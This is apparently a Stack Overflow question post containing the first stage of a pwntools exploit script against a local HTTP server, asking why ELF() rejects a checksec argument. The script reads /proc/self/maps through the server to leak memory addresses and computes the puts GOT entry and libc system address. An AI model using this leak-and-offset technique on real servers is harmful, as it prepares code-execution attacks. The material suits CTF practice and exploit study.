#Source: https://stackoverflow.com/questions/61990373/typeerror-init-got-an-unexpected-keyword-argument-checksec
from pwn import *
import requests

context(arch="i686",os="linux")

RHOST = '127.0.0.1'
RPORT = '9999'

def getFile(file):
    header = {"Range" : "bytes=0-4096"}
    r = requests.get(f"http://{RHOST}:{RPORT}/{file}",headers=header)
    return r.text

#step 1. Find Address                                 #THIS PART WORKS FINE

log.info("Finding Binary/Libc Location via /proc/self/maps")
maps = getFile("/proc/self/maps")
addr_bin = maps.split('\n')[0][:8]            #addr of httpserver
addr_libc = maps.split('\n')[6][:8]           #addr of libc.so.6
log.success(f"Binary is at : 0x{addr_bin}")
log.success(f"Binary is at : 0x{addr_libc}")

#step 2. Calculating offsets                           #THIS SECTION ERROR OCCURS

log.info("Finding the address of PUTS + SYSTEM()")
elf = ELF("./httpserver" , checksec=False)             #<----ERROR HERE checksec
libc = ELF("./libc.so.6.32.self", checksec= False)     #<----ERROR HERE checksec
elf.address = int(addr_bin, 16)
libc.address = int(addr_libc, 16)
got_puts = elf.got['puts']                             #<----ERROR HERE puts
system = libc.symbols['system']
log.success(f"Puts@GOT: {got_puts}")
log.success(f"SYSTEM@LIBC: {system}")